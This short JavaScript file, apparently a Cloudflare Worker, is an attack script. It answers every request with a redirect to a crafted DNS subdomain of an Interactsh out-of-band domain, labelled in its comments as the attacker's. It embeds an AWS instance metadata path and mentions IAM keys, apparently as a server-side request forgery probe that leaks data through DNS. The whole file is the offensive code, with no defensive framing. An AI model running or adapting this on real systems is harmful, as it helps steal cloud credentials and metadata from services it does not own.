export default {
  async fetch(request) {
    // Step 1: Extract the AWS metadata path (e.g., hostname, IAM keys)
    const awsPath = "169-254-169-254.latest.meta-data.hostname"; // DNS-safe format
    const attackerDomain = "bjgibppjensgmxvguqwdm2xp3ddbjdtag.oast.fun"; // Your Interactsh domain

    // Step 2: Redirect to a crafted DNS subdomain
    return Response.redirect(`http://${awsPath}.${attackerDomain}`, 302);
  }
};
